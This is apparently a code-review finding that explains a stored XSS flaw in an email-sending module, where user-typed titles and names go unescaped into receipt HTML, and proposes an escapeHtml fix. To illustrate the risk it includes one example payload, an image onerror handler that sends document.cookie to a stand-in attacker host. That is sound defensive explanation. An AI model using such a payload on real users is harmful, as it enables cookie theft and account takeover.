1. The mailer HTML-injection
What's happening: sendReceipt() builds an HTML email as a plain JS template string. data.requestTitle, data.helperName, data.requesterName all come from the database, and those fields ultimately trace back to things a user typed — a request title when posting a job, a display name at signup. They get dropped straight into <div>${data.requestTitle}</div> with no escaping.
Why it's a real risk, not theoretical: if someone sets their display name to something like <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">, that string becomes literal, executing HTML in the recipient's email client whenever they get a receipt naming that person as helper or requester. Most modern webmail clients strip <script> tags but many still render inline event handlers like onerror/onload on images, and some still allow more. It's a classic stored-XSS-via-email pattern. The subject line (✅ Help completed: ${data.requestTitle}) is lower-risk but still unescaped.
The fix: add one small, pure function — something like:
tsfunction escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
then wrap every user-controlled interpolation: ${escapeHtml(data.requestTitle)}, ${escapeHtml(data.helperName)}, ${escapeHtml(data.requesterName)} — in both sendReceipt and sendTipNotification (which has the same pattern with requestTitle/helperName). I'd export it so the existing test file (mailer.test.ts, which already expects exactly this function) starts passing instead of erroring on a missing import. No schema or API changes — contained to mailer.ts.
